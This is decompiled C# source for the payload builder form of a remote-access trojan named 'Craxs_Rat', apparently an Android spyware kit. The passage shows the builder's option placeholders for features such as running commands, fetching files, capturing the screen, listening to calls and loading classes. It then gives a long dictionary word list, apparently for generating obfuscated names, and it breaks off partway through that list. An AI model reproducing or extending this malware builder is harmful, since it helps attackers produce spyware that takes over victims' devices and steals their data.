using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;
using Craxs_Rat.My;
using DrakeUI.Framework;
using MetroSet_UI.Components;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x020000A3 RID: 163
	[DesignerGenerated]
	public partial class Build : Form
	{
		// Token: 0x060008C3 RID: 2243 RVA: 0x00042058 File Offset: 0x00040258
		public Build()
		{
			base.Load += this.Build_Load;
			base.Closing += this.Build_Closing;
			base.FormClosing += this.Build_FormClosing;
			this.bool_2 = false;
			this.string_0 = "[x0b0x]";
			this.string_1 = "null";
			this.string_2 = "null";
			this.string_3 = "off";
			this.string_4 = "off";
			this.string_5 = "off";
			this.string_6 = "off";
			this.string_7 = "null";
			this.string_8 = "null";
			this.string_9 = "no";
			this.string_10 = "no";
			this.string_11 = "no";
			this.string_12 = "no";
			this.string_13 = "no";
			this.string_14 = "no";
			this.string_15 = "no";
			this.string_16 = "no";
			this.string_17 = "no";
			this.string_18 = "no";
			this.string_19 = "no";
			this.string_20 = "no";
			this.string_21 = "no";
			this.string_22 = "[x0DNS0x]";
			this.color_0 = Color.FromArgb(190, 190, 190);
			this.color_1 = Color.FromArgb(20, 20, 20);
			this.gcontrol0_0 = new GControl0();
			this.string_23 = "";
			this.T = "T";
			this.string_24 = " ";
			this.string_25 = " ";
			this.string_26 = "null";
			this.string_27 = "null";
			this.string_28 = "null";
			this.string_29 = "29";
			this.string_30 = "";
			this.string_31 = "";
			this.string_32 = "";
			this.string_33 = "";
			this.string_34 = "NO";
			this.int_0 = 0;
			this.int_1 = 10;
			this.bitmap_0 = null;
			this.int_2 = 0;
			this.int_3 = 0;
			this.package = "package";
			this.name = "name";
			this.activz = "activz";
			this.brodatz = "brodatz";
			this.servziz = "servziz";
			this.tolziz = "tolziz";
			this._ask_prim_ = "_ask_prim_";
			this._trns_g_ = "_trns_g_";
			this._cap_sc_ = "_cap_sc_";
			this._access_ask_ = "_access_ask_";
			this._scctrl_ = "_scctrl_";
			this._news_g_ = "_news_g_";
			this._strt_view_ = "_strt_view_";
			this._sc_fb_ = "_sc_fb_";
			this._ask_draw_ = "_ask_draw_";
			this._ask_battary_ = "_ask_battary_";
			this._engine_wrk_ = "_engine_wrk_";
			this._skin_cls_ = "_skin_cls_";
			this._update_app_ = "_update_app_";
			this._callr_lsnr_ = "_callr_lsnr_";
			this._clss_loder_ = "_clss_loder_";
			this._excut_meth_ = "_excut_meth_";
			this._run_comnd_ = "_run_comnd_";
			this._get_me_fil_ = "_get_me_fil_";
			this._srv_worker_ = "_srv_worker_";
			this.QQ0 = "QQ0";
			this.QQ1 = "QQ1";
			this.QQ2 = "QQ2";
			this.QQ3 = "QQ3";
			this.QQ4 = "QQ4";
			this.QQ5 = "QQ5";
			this.QQ6 = "QQ6";
			this.QQ8 = "QQ8";
			this.QQ9 = "QQ9";
			this.QQ10 = "QQ10";
			this.QQ11 = "QQ11";
			this.QQ12 = "QQ12";
			this.QQ13 = "QQ13";
			this.QQ14 = "QQ14";
			this.payload = "payload";
			this.string_47 = "str0";
			this.string_48 = "str1";
			this.string_49 = "str2";
			this.string_50 = "str3";
			this.string_51 = "str4";
			this.string_52 = "str5";
			this.str6 = "str6";
			this.str7 = "str7";
			this.str8 = "str8";
			this.str9 = "str9";
			this.str10 = "str10";
			this.str11 = "str11";
			this.str12 = "str12";
			this.app0 = "app0";
			this.ico0 = "ico0";
			this.ico1 = "ico1";
			this.web0 = "web0";
			this.noti8 = "noti8";
			this.string_53 = "str0";
			this.string_54 = "str1";
			this.string_55 = "str2";
			this.string_56 = "str3";
			this.string_57 = "str4";
			this.string_58 = "str5";
			this.string_59 = "str5";
			this.string_60 = "str5";
			this.string_61 = "str5";
			this.string_62 = "str5";
			this.string_63 = "str5";
			this.string_64 = "str5";
			this.string_65 = "str5";
			this.string_66 = "str5";
			this.string_67 = "str5";
			this.string_68 = "";
			this.random_0 = null;
			this.bool_4 = true;
			this.bool_5 = false;
			this.bool_6 = false;
			this.bool_7 = false;
			this.bool_8 = false;
			this.bool_9 = false;
			this.bool_10 = false;
			this.bool_11 = false;
			this.strings_0 = new string[]
			{
				"a",
				"aa",
				"aaa",
				"aaron",
				"ab",
				"abandoned",
				"abc",
				"aberdeen",
				"abilities",
				"ability",
				"able",
				"aboriginal",
				"abortion",
				"about",
				"above",
				"abraham",
				"abroad",
				"abs",
				"absence",
				"absent",
				"absolute",
				"absolutely",
				"absorption",
				"abstract",
				"abstracts",
				"abu",
				"abuse",
				"ac",
				"academic",
				"academics",
				"academy",
				"acc",
				"accent",
				"accept",
				"acceptable",
				"acceptance",
				"accepted",
				"accepting",
				"accepts",
				"access",
				"accessed",
				"accessibility",
				"accessible",
				"accessing",
				"accessories",
				"accessory",
				"accident",
				"accidents",
				"accommodate",
				"accommodation",
				"accommodations",
				"accompanied",
				"accompanying",
				"accomplish",
				"accomplished",
				"accordance",
				"according",
				"accordingly",
				"account",
				"accountability",
				"accounting",
				"accounts",
				"accreditation",
				"accredited",
				"accuracy",
				"accurate",
				"accurately",
				"accused",
				"acdbentity",
				"ace",
				"acer",
				"achieve",
				"achieved",
				"achievement",
				"achievements",
				"achieving",
				"acid",
				"acids",
				"acknowledge",
				"acknowledged",
				"acm",
				"acne",
				"acoustic",
				"acquire",
				"acquired",
				"acquisition",
				"acquisitions",
				"acre",
				"acres",
				"acrobat",
				"across",
				"acrylic",
				"act",
				"acting",
				"action",
				"actions",
				"activated",
				"activation",
				"active",
				"actively",
				"activists",
				"activities",
				"activity",
				"actor",
				"actors",
				"actress",
				"acts",
				"actual",
				"actually",
				"acute",
				"ad",
				"ada",
				"adam",
				"adams",
				"adaptation",
				"adapted",
				"adapter",
				"adapters",
				"adaptive",
				"adaptor",
				"add",
				"added",
				"addiction",
				"adding",
				"addition",
				"additional",
				"additionally",
				"additions",
				"address",
				"addressed",
				"addresses",
				"addressing",
				"adds",
				"adelaide",
				"adequate",
				"adidas",
				"adipex",
				"adjacent",
				"adjust",
				"adjustable",
				"adjusted",
				"adjustment",
				"adjustments",
				"admin",
				"administered",
				"administration",
				"administrative",
				"administrator",
				"administrators",
				"admission",
				"admissions",
				"admit",
				"admitted",
				"adobe",
				"adolescent",
				"adopt",
				"adopted",
				"adoption",
				"adrian",
				"ads",
				"adsl",
				"adult",
				"adults",
				"advance",
				"advanced",
				"advancement",
				"advances",
				"advantage",
				"advantages",
				"adventure",
				"adventures",
				"adverse",
				"advert",
				"advertise",
				"advertisement",
				"advertisements",
				"advertiser",
				"advertisers",
				"advertising",
				"advice",
				"advise",
				"advised",
				"advisor",
				"advisors",
				"advisory",
				"advocacy",
				"advocate",
				"adware",
				"ae",
				"aerial",
				"aerospace",
				"af",
				"affair",
				"affairs",
				"affect",
				"affected",
				"affecting",
				"affects",
				"affiliate",
				"affiliated",
				"affiliates",
				"affiliation",
				"afford",
				"affordable",
				"afghanistan",
				"afraid",
				"africa",
				"african",
				"after",
				"afternoon",
				"afterwards",
				"ag",
				"again",
				"against",
				"age",
				"aged",
				"agencies",
				"agency",
				"agenda",
				"agent",
				"agents",
				"ages",
				"aggregate",
				"aggressive",
				"aging",
				"ago",
				"agree",
				"agreed",
				"agreement",
				"agreements",
				"agrees",
				"agricultural",
				"agriculture",
				"ah",
				"ahead",
				"ai",
				"aid",
				"aids",
				"aim",
				"aimed",
				"aims",
				"air",
				"aircraft",
				"airfare",
				"airline",
				"airlines",
				"airplane",
				"airport",
				"airports",
				"aj",
				"ak",
				"aka",
				"al",
				"ala",
				"alabama",
				"alan",
				"alarm",
				"alaska",
				"albania",
				"albany",
				"albert",
				"alberta",
				"album",
				"albums",
				"albuquerque",
				"alcohol",
				"alert",
				"alerts",
				"alex",
				"alexander",
				"alexandria",
				"alfred",
				"algebra",
				"algeria",
				"algorithm",
				"algorithms",
				"ali",
				"alias",
				"alice",
				"alien",
				"align",
				"alignment",
				"alike",
				"alive",
				"all",
				"allah",
				"allan",
				"alleged",
				"allen",
				"allergy",
				"alliance",
				"allied",
				"allocated",
				"allocation",
				"allow",
				"allowance",
				"allowed",
				"allowing",
				"allows",
				"alloy",
				"almost",
				"alone",
				"along",
				"alot",
				"alpha",
				"alphabetical",
				"alpine",
				"already",
				"also",
				"alt",
				"alter",
				"altered",
				"alternate",
				"alternative",
				"alternatively",
				"alternatives",
				"although",
				"alto",
				"aluminium",
				"aluminum",
				"alumni",
				"always",
				"am",
				"amanda",
				"amateur",
				"amazing",
				"amazon",
				"amazoncom",
				"amazoncouk",
				"ambassador",
				"amber",
				"ambien",
				"ambient",
				"amd",
				"amend",
				"amended",
				"amendment",
				"amendments",
				"amenities",
				"america",
				"american",
				"americans",
				"americas",
				"amino",
				"among",
				"amongst",
				"amount",
				"amounts",
				"amp",
				"ampland",
				"amplifier",
				"amsterdam",
				"amy",
				"an",
				"ana",
				"anaheim",
				"anal",
				"analog",
				"analyses",
				"analysis",
				"analyst",
				"analysts",
				"analytical",
				"analyze",
				"analyzed",
				"anatomy",
				"anchor",
				"ancient",
				"and",
				"andale",
				"anderson",
				"andorra",
				"andrea",
				"andreas",
				"andrew",
				"andrews",
				"andy",
				"angel",
				"angela",
				"angeles",
				"angels",
				"anger",
				"angle",
				"angola",
				"angry",
				"animal",
				"animals",
				"animated",
				"animation",
				"anime",
				"ann",
				"anna",
				"anne",
				"annex",
				"annie",
				"anniversary",
				"annotated",
				"annotation",
				"announce",
				"announced",
				"announcement",
				"announcements",
				"announces",
				"annoying",
				"annual",
				"annually",
				"anonymous",
				"another",
				"answer",
				"answered",
				"answering",
				"answers",
				"ant",
				"antarctica",
				"antenna",
				"anthony",
				"anthropology",
				"anti",
				"antibodies",
				"antibody",
				"anticipated",
				"antigua",
				"antique",
				"antiques",
				"antivirus",
				"antonio",
				"anxiety",
				"any",
				"anybody",
				"anymore",
				"anyone",
				"anything",
				"anytime",
				"anyway",
				"anywhere",
				"aol",
				"ap",
				"apache",
				"apart",
				"apartment",
				"apartments",
				"api",
				"apnic",
				"apollo",
				"app",
				"apparatus",
				"apparel",
				"apparent",
				"apparently",
				"appeal",
				"appeals",
				"appear",
				"appearance",
				"appeared",
				"appearing",
				"appears",
				"appendix",
				"apple",
				"appliance",
				"appliances",
				"applicable",
				"applicant",
				"applicants",
				"application",
				"applications",
				"applied",
				"applies",
				"apply",
				"applying",
				"appointed",
				"appointment",
				"appointments",
				"appraisal",
				"appreciate",
				"appreciated",
				"appreciation",
				"approach",
				"approaches",
				"appropriate",
				"appropriations",
				"approval",
				"approve",
				"approved",
				"approx",
				"approximate",
				"approximately",
				"apps",
				"apr",
				"april",
				"apt",
				"aqua",
				"aquarium",
				"aquatic",
				"ar",
				"arab",
				"arabia",
				"arabic",
				"arbitrary",
				"arbitration",
				"arc",
				"arcade",
				"arch",
				"architect",
				"architects",
				"architectural",
				"architecture",
				"archive",
				"archived",
				"archives",
				"arctic",
				"are",
				"area",
				"areas",
				"arena",
				"arg",
				"argentina",
				"argue",
				"argued",
				"argument",
				"arguments",
				"arise",
				"arising",
				"arizona",
				"arkansas",
				"arlington",
				"arm",
				"armed",
				"armenia",
				"armor",
				"arms",
				"armstrong",
				"army",
				"arnold",
				"around",
				"arrange",
				"arranged",
				"arrangement",
				"arrangements",
				"array",
				"arrest",
				"arrested",
				"arrival",
				"arrivals",
				"arrive",
				"arrived",
				"arrives",
				"arrow",
				"art",
				"arthritis",
				"arthur",
				"article",
				"articles",
				"artificial",
				"artist",
				"artistic",
				"artists",
				"arts",
				"artwork",
				"aruba",
				"as",
				"asbestos",
				"ascii",
				"ash",
				"ashley",
				"asia",
				"asian",
				"aside",
				"asin",
				"ask",
				"asked",
				"asking",
				"asks",
				"asn",
				"asp",
				"aspect",
				"aspects",
				"aspnet",
				"ass",
				"assault",
				"assembled",
				"assembly",
				"assess",
				"assessed",
				"assessing",
				"assessment",
				"assessments",
				"asset",
				"assets",
				"assign",
				"assigned",
				"assignment",
				"assignments",
				"assist",
				"assistance",
				"assistant",
				"assisted",
				"assists",
				"associate",
				"associated",
				"associates",
				"association",
				"associations",
				"assume",
				"assumed",
				"assumes",
				"assuming",
				"assumption",
				"assumptions",
				"assurance",
				"assure",
				"assured",
				"asthma",
				"astrology",
				"astronomy",
				"asus",
				"at",
				"ata",
				"ate",
				"athens",
				"athletes",
				"athletic",
				"athletics",
				"ati",
				"atlanta",
				"atlantic",
				"atlas",
				"atm",
				"atmosphere",
				"atmospheric",
				"atom",
				"atomic",
				"attach",
				"attached",
				"attachment",
				"attachments",
				"attack",
				"attacked",
				"attacks",
				"attempt",
				"attempted",
				"attempting",
				"attempts",
				"attend",
				"attendance",
				"attended",
				"attending",
				"attention",
				"attitude",
				"attitudes",
				"attorney",
				"attorneys",
				"attract",
				"attraction",
				"attractions",
				"attractive",
				"attribute",
				"attributes",
				"au",
				"auburn",
				"auckland",
				"auction",
				"auctions",
				"aud",
				"audi",
				"audience",
				"audio",
				"audit",
				"auditor",
				"aug",
				"august",
				"aurora",
				"aus",
				"austin",
				"australia",
				"australian",
				"austria",
				"authentic",
				"authentication",
				"author",
				"authorities",
				"authority",
				"authorization",
				"authorized",
				"authors",
				"auto",
				"automated",
				"automatic",
				"automatically",
				"automation",
				"automobile",
				"automobiles",
				"automotive",
				"autos",
				"autumn",
				"av",
				"availability",
				"available",
				"avatar",
				"ave",
				"avenue",
				"average",
				"avg",
				"avi",
				"aviation",
				"avoid",
				"avoiding",
				"avon",
				"aw",
				"award",
				"awarded",
				"awards",
				"aware",
				"awareness",
				"away",
				"awesome",
				"awful",
				"axis",
				"aye",
				"az",
				"azerbaijan",
				"b",
				"ba",
				"babe",
				"babes",
				"babies",
				"baby",
				"bachelor",
				"back",
				"backed",
				"background",
				"backgrounds",
				"backing",
				"backup",
				"bacon",
				"bacteria",
				"bacterial",
				"bad",
				"badge",
				"badly",
				"bag",
				"baghdad",
				"bags",
				"bahamas",
				"bahrain",
				"bailey",
				"baker",
				"baking",
				"balance",
				"balanced",
				"bald",
				"bali",
				"ball",
				"ballet",
				"balloon",
				"ballot",
				"balls",
				"baltimore",
				"ban",
				"banana",
				"band",
				"bands",
				"bandwidth",
				"bang",
				"bangbus",
				"bangkok",
				"bangladesh",
				"bank",
				"banking",
				"bankruptcy",
				"banks",
				"banned",
				"banner",
				"banners",
				"baptist",
				"bar",
				"barbados",
				"barbara",
				"barbie",
				"barcelona",
				"bare",
				"barely",
				"bargain",
				"bargains",
				"barn",
				"barnes",
				"barrel",
				"barrier",
				"barriers",
				"barry",
				"bars",
				"base",
				"baseball",
				"based",
				"baseline",
				"basement",
				"basename",
				"bases",
				"basic",
				"basically",
				"basics",
				"basin",
				"basis",
				"basket",
				"basketball",
				"baskets",
				"bass",
				"bat",
				"batch",
				"bath",
				"bathroom",
				"bathrooms",
				"baths",
				"batman",
				"batteries",
				"battery",
				"battle",
				"battlefield",
				"bay",
				"bb",
				"bbc",
				"bbs",
				"bbw",
				"bc",
				"bd",
				"bdsm",
				"be",
				"beach",
				"beaches",
				"beads",
				"beam",
				"bean",
				"beans",
				"bear",
				"bearing",
				"bears",
				"beast",
				"beastality",
				"beastiality",
				"beat",
				"beatles",
				"beats",
				"beautiful",
				"beautifully",
				"beauty",
				"beaver",
				"became",
				"because",
				"become",
				"becomes",
				"becoming",
				"bed",
				"bedding",
				"bedford",
				"bedroom",
				"bedrooms",
				"beds",
				"bee",
				"beef",
				"been",
				"beer",
				"before",
				"began",
				"begin",
				"beginner",
				"beginners",
				"beginning",
				"begins",
				"begun",
				"behalf",
				"behavior",
				"behavioral",
				"behaviour",
				"behind",
				"beijing",
				"being",
				"beings",
				"belarus",
				"belfast",
				"belgium",
				"belief",
				"beliefs",
				"believe",
				"believed",
				"believes",
				"belize",
				"belkin",
				"bell",
				"belle",
				"belly",
				"belong",
				"belongs",
				"below",
				"belt",
				"belts",
				"ben",
				"bench",
				"benchmark",
				"bend",
				"beneath",
				"beneficial",
				"benefit",
				"benefits",
				"benjamin",
				"bennett",
				"benz",
				"berkeley",
				"berlin",
				"bermuda",
				"bernard",
				"berry",
				"beside",
				"besides",
				"best",
				"bestiality",
				"bestsellers",
				"bet",
				"beta",
				"beth",
				"better",
				"betting",
				"betty",
				"between",
				"beverage",
				"beverages",
				"beverly",
				"beyond",
				"bg",
				"bhutan",
				"bi",
				"bias",
				"bible",
				"biblical",
				"bibliographic",
				"bibliography",
				"bicycle",
				"bid",
				"bidder",
				"bidding",
				"bids",
				"big",
				"bigger",
				"biggest",
				"bike",
				"bikes",
				"bikini",
				"bill",
				"billing",
				"billion",
				"bills",
				"billy",
				"bin",
				"binary",
				"bind",
				"binding",
				"bingo",
				"bio",
				"biodiversity",
				"biographies",
				"biography",
				"biol",
				"biological",
				"biology",
				"bios",
				"biotechnology",
				"bird",
				"birds",
				"birmingham",
				"birth",
				"birthday",
				"bishop",
				"bit",
				"bitch",
				"bite",
				"bits",
				"biz",
				"bizarre",
				"bizrate",
				"bk",
				"bl",
				"black",
				"blackberry",
				"blackjack",
				"blacks",
				"blade",
				"blades",
				"blah",
				"blair",
				"blake",
				"blame",
				"blank",
				"blanket",
				"blast",
				"bleeding",
				"blend",
				"bless",
				"blessed",
				"blind",
				"blink",
				"block",
				"blocked",
				"blocking",
				"blocks",
				"blog",
				"blogger",
				"bloggers",
				"blogging",
				"blogs",
				"blond",
				"blonde",
				"blood",
				"bloody",
				"bloom",
				"bloomberg",
				"blow",
				"blowing",
				"blowjob",
				"blowjobs",
				"blue",
				"blues",
				"bluetooth",
				"blvd",
				"bm",
				"bmw",
				"bo",
				"board",
				"boards",
				"boat",
				"boating",
				"boats",
				"bob",
				"bobby",
				"boc",
				"bodies",
				"body",
				"bold",
				"bolivia",
				"bolt",
				"bomb",
				"bon",
				"bond",
				"bondage",
				"bonds",
				"bone",
				"bones",
				"bonus",
				"boob",
				"boobs",
				"book",
				"booking",
				"bookings",
				"bookmark",
				"bookmarks",
				"books",
				"bookstore",
				"bool",
				"boolean",
				"boom",
				"boost",
				"boot",
				"booth",
				"boots",
				"booty",
				"border",
				"borders",
				"bored",
				"boring",
				"born",
				"borough",
				"bosnia",
				"boss",
				"boston",
				"both",
				"bother",
				"botswana",
				"bottle",
				"bottles",
				"bottom",
				"bought",
				"boulder",
				"boulevard",
				"bound",
				"boundaries",
				"boundary",
				"bouquet",
				"boutique",
				"bow",
				"bowl",
				"bowling",
				"box",
				"boxed",
				"boxes",
				"boxing",
				"boy",
				"boys",
				"bp",
				"br",
				"bra",
				"bracelet",
				"bracelets",
				"bracket",
				"brad",
				"bradford",
				"bradley",
				"brain",
				"brake",
				"brakes",
				"branch",
				"branches",
				"brand",
				"brandon",
				"brands",
				"bras",
				"brass",
				"brave",
				"brazil",
				"brazilian",
				"breach",
				"bread",
				"break",
				"breakdown",
				"breakfast",
				"breaking",
				"breaks",
				"breast",
				"breasts",
				"breath",
				"breathing",
				"breed",
				"breeding",
				"breeds",
				"brian",
				"brick",
				"bridal",
				"bride",
				"bridge",
				"bridges",
				"brief",
				"briefing",
				"briefly",
				"briefs",
				"bright",
				"brighton",
				"brilliant",
				"bring",
				"bringing",
				"brings",
				"brisbane",
				"bristol",
				"britain",
				"britannica",
				"british",
				"britney",
				"broad",
				"broadband",
				"broadcast",
				"broadcasting",
				"broader",
				"broadway",
				"brochure",
				"brochures",
				"broke",
				"broken",
				"broker",
				"brokers",
				"bronze",
				"brook",
				"brooklyn",
				"brooks",
				"bros",
				"brother",
				"brothers",
				"brought",
				"brown",
				"browse",
				"browser",
				"browsers",
				"browsing",
				"bruce",
				"brunei",
				"brunette",
				"brunswick",
				"brush",
				"brussels",
				"brutal",
				"bryan",
				"bryant",
				"bs",
				"bt",
				"bubble",
				"buck",
				"bucks",
				"budapest",
				"buddy",
				"budget",
				"budgets",
				"buf",
				"buffalo",
				"buffer",
				"bufing",
				"bug",
				"bugs",
				"build",
				"builder",
				"builders",
				"building",
				"buildings",
				"builds",
				"built",
				"bukkake",
				"bulgaria",
				"bulgarian",
				"bulk",
				"bull",
				"bullet",
				"bulletin",
				"bumper",
				"bunch",
				"bundle",
				"bunny",
				"burden",
				"bureau",
				"buried",
				"burke",
				"burlington",
				"burn",
				"burner",
				"burning",
				"burns",
				"burst",
				"burton",
				"bus",
				"buses",
				"bush",
				"business",
				"businesses",
				"busty",
				"busy",
				"but",
				"butler",
				"butt",
				"butter",
				"butterfly",
				"button",
				"buttons",
				"butts",
				"buy",
				"buyer",
				"buyers",
				"buying",
				"buys",
				"buzz",
				"bw",
				"by",
				"bye",
				"byte",
				"bytes",
				"c",
				"ca",
				"cab",
				"cabin",
				"cabinet",
				"cabinets",
				"cable",
				"cables",
				"cache",
				"cached",
				"cad",
				"cadillac",
				"cafe",
				"cage",
				"cake",
				"cakes",
				"cal",
				"calcium",
				"calculate",
				"calculated",
				"calculation",
				"calculations",
				"calculator",
				"calculators",
				"calendar",
				"calendars",
				"calgary",
				"calibration",
				"calif",
				"california",
				"call",
				"called",
				"calling",
				"calls",
				"calm",
				"calvin",
				"cam",
				"cambodia",
				"cambridge",
				"camcorder",
				"camcorders",
				"came",
				"camel",
				"camera",
				"cameras",
				"cameron",
				"cameroon",
				"camp",
				"campaign",
				"campaigns",
				"campbell",
				"camping",
				"camps",
				"campus",
				"cams",
				"can",
				"canada",
				"canadian",
				"canal",
				"canberra",
				"cancel",
				"cancellation",
				"cancelled",
				"cancer",
				"candidate",
				"candidates",
				"candle",
				"candles",
				"candy",
				"cannon",
				"canon",
				"cant",
				"canvas",
				"canyon",
				"cap",
				"capabilities",
				"capability",
				"capable",
				"capacity",
				"cape",
				"capital",
				"capitol",
				"caps",
				"captain",
				"capture",
				"captured",
				"car",
				"carb",
				"carbon",
				"card",
				"cardiac",
				"cardiff",
				"cardiovascular",
				"cards",
				"care",
				"career",
				"careers",
				"careful",
				"carefully",
				"carey",
				"cargo",
				"caribbean",
				"caring",
				"carl",
				"carlo",
				"carlos",
				"carmen",
				"carnival",
				"carol",
				"carolina",
				"caroline",
				"carpet",
				"carried",
				"carrier",
				"carriers",
				"carries",
				"carroll",
				"carry",
				"carrying",
				"cars",
				"cart",
				"carter",
				"cartoon",
				"cartoons",
				"cartridge",
				"cartridges",
				"cas",
				"casa",
				"case",
				"cases",
				"casey",
				"cash",
				"cashiers",
				"casino",
				"casinos",
				"casio",
				"cassette",
				"cast",
				"casting",
				"castle",
				"casual",
				"cat",
				"catalog",
				"catalogs",
				"catalogue",
				"catalyst",
				"catch",
				"categories",
				"category",
				"catering",
				"cathedral",
				"catherine",
				"catholic",
				"cats",
				"cattle",
				"caught",
				"cause",
				"caused",
				"causes",
				"causing",
				"caution",
				"cave",
				"cayman",
				"cb",
				"cbs",
				"cc",
				"ccd",
				"cd",
				"cdna",
				"cds",
				"cdt",
				"ce",
				"cedar",
				"ceiling",
				"celebrate",
				"celebration",
				"celebrities",
				"celebrity",
				"celebs",
				"cell",
				"cells",
				"cellular",
				"celtic",
				"cement",
				"cemetery",
				"census",
				"cent",
				"center",
				"centered",
				"centers",
				"central",
				"centre",
				"centres",
				"cents",
				"centuries",
				"century",
				"ceo",
				"ceramic",
				"ceremony",
				"certain",
				"certainly",
				"certificate",
				"certificates",
				"certification",
				"certified",
				"cest",
				"cet",
				"cf",
				"cfr",
				"cg",
				"cgi",
				"ch",
				"chad",
				"chain",
				"chains",
				"chair",
				"chairman",
				"chairs",
				"challenge",
				"challenged",
				"challenges",
				"challenging",
				"chamber",
				"chambers",
				"champagne",
				"champion",
				"champions",
				"championship",
				"championships",
				"chan",
				"chance",
				"chancellor",
				"chances",
				"change",
				"changed",
				"changelog",
				"changes",
				"changing",
				"channel",
				"channels",
				"chaos",
				"chapel",
				"chapter",
				"chapters",
				"char",
				"character",
				"characteristic",
				"characteristics",
				"characterization",
				"characterized",
				"characters",
				"charge",
				"charged",
				"charger",
				"chargers",
				"charges",
				"charging",
				"charitable",
				"charity",
				"charles",
				"charleston",
				"charlie",
				"charlotte",
				"charm",
				"charming",
				"charms",
				"chart",
				"charter",
				"charts",
				"chase",
				"chassis",
				"chat",
				"cheap",
				"cheaper",
				"cheapest",
				"cheat",
				"cheats",
				"check",
				"checked",
				"checking",
				"checklist",
				"checkout",
				"checks",
				"cheers",
				"cheese",
				"chef",
				"chelsea",
				"chem",
				"chemical",
				"chemicals",
				"chemistry",
				"chen",
				"cheque",
				"cherry",
				"chess",
				"chest",
				"chester",
				"chevrolet",
				"chevy",
				"chi",
				"chicago",
				"chick",
				"chicken",
				"chicks",
				"chief",
				"child",
				"childhood",
				"children",
				"childrens",
				"chile",
				"china",
				"chinese",
				"chip",
				"chips",
				"cho",
				"chocolate",
				"choice",
				"choices",
				"choir",
				"cholesterol",
				"choose",
				"choosing",
				"chorus",
				"chose",
				"chosen",
				"chris",
				"christ",
				"christian",
				"christianity",
				"christians",
				"christina",
				"christine",
				"christmas",
				"christopher",
				"chrome",
				"chronic",
				"chronicle",
				"chronicles",
				"chrysler",
				"chubby",
				"chuck",
				"church",
				"churches",
				"ci",
				"cia",
				"cialis",
				"ciao",
				"cigarette",
				"cigarettes",
				"cincinnati",
				"cindy",
				"cinema",
				"cingular",
				"cio",
				"cir",
				"circle",
				"circles",
				"circuit",
				"circuits",
				"circular",
				"circulation",
				"circumstances",
				"circus",
				"cisco",
				"citation",
				"citations",
				"cite",
				"cited",
				"cities",
				"citizen",
				"citizens",
				"citizenship",
				"city",
				"citysearch",
				"civic",
				"civil",
				"civilian",
				"civilization",
				"cj",
				"cl",
				"claim",
				"claimed",
				"claims",
				"claire",
				"clan",
				"clara",
				"clarity",
				"clark",
				"clarke",
				"class",
				"classes",
				"classic",
				"classical",
				"classics",
				"classification",
				"classified",
				"classifieds",
				"classroom",
				"clause",
				"clay",
				"clean",
				"cleaner",
				"cleaners",
				"cleaning",
				"cleanup",
				"clear",
				"clearance",
				"cleared",
				"clearing",
				"clearly",
				"clerk",
				"cleveland",
				"click",
				"clicking",
				"clicks",
				"client",
				"clients",
				"cliff",
				"climate",
				"climb",
				"climbing",
				"clinic",
				"clinical",
				"clinics",
				"clinton",
				"clip",
				"clips",
				"clock",
				"clocks",
				"clone",
				"close",
				"closed",
				"closely",
				"closer",
				"closes",
				"closest",
				"closing",
				"closure",
				"cloth",
				"clothes",
				"clothing",
				"cloud",
				"clouds",
				"cloudy",
				"club",
				"clubs",
				"cluster",
				"clusters",
				"cm",
				"cms",
				"cn",
				"cnet",
				"cnetcom",
				"cnn",
				"co",
				"coach",
				"coaches",
				"coaching",
				"coal",
				"coalition",
				"coast",
				"coastal",
				"coat",
				"coated",
				"coating",
				"cock",
				"cocks",
				"cod",
				"code",
				"codes",
				"coding",
				"coffee",
				"cognitive",
				"cohen",
				"coin",
				"coins",
				"col",
				"cold",
				"cole",
				"coleman",
				"colin",
				"collaboration",
				"collaborative",
				"collapse",
				"collar",
				"colleague",
				"colleagues",
				"collect",
				"collectables",
				"collected",
				"collectible",
				"collectibles",
				"collecting",
				"collection",
				"collections",
				"collective",
				"collector",
				"collectors",
				"college",
				"colleges",
				"collins",
				"cologne",
				"colombia",
				"colon",
				"colonial",
				"colony",
				"color",
				"colorado",
				"colored",
				"colors",
				"colour",
				"colours",
				"columbia",
				"columbus",
				"column",
				"columnists",
				"columns",
				"org",
				"combat",
				"combination",
				"combinations",
				"combine",
				"combined",
				"combines",
				"combining",
				"combo",
				"come",
				"comedy",
				"comes",
				"comfort",
				"comfortable",
				"comic",
				"comics",
				"coming",
				"comm",
				"command",
				"commander",
				"commands",
				"comment",
				"commentary",
				"commented",
				"comments",
				"commerce",
				"commercial",
				"commission",
				"commissioner",
				"commissioners",
				"commissions",
				"commit",
				"commitment",
				"commitments",
				"committed",
				"committee",
				"committees",
				"commodities",
				"commodity",
				"common",
				"commonly",
				"commons",
				"commonwealth",
				"communicate",
				"communication",
				"communications",
				"communist",
				"communities",
				"community",
				"comp",
				"compact",
				"companies",
				"companion",
				"company",
				"compaq",
				"comparable",
				"comparative",
				"compare",
				"compared",
				"comparing",
				"comparison",
				"comparisons",
				"compatibility",
				"compatible",
				"compensation",
				"compete",
				"competent",
				"competing",
				"competition",
				"competitions",
				"competitive",
				"competitors",
				"compilation",
				"compile",
				"compiled",
				"compiler",
				"complaint",
				"complaints",
				"complement",
				"complete",
				"completed",
				"completely",
				"completing",
				"completion",
				"complex",
				"complexity",
				"compliance",
				"compliant",
				"complicated",
				"complications",
				"complimentary",
				"comply",
				"component",
				"components",
				"composed",
				"composer",
				"composite",
				"composition",
				"compound",
				"compounds",
				"comprehensive",
				"compressed",
				"compression",
				"compromise",
				"computation",
				"computational",
				"compute",
				"computed",
				"computer",
				"computers",
				"computing",
				"con",
				"concentrate",
				"concentration",
				"concentrations",
				"concept",
				"concepts",
				"conceptual",
				"concern",
				"concerned",
				"concerning",
				"concerns",
				"concert",
				"concerts",
				"conclude",
				"concluded",
				"conclusion",
				"conclusions",
				"concord",
				"concrete",
				"condition",
				"conditional",
				"conditioning",
				"conditions",
				"condo",
				"condos",
				"conduct",
				"conducted",
				"conducting",
				"conf",
				"conference",
				"conferences",
				"conferencing",
				"confidence",
				"confident",
				"confidential",
				"confidentiality",
				"config",
				"configuration",
				"configure",
				"configured",
				"configuring",
				"confirm",
				"confirmation",
				"confirmed",
				"conflict",
				"conflicts",
				"confused",
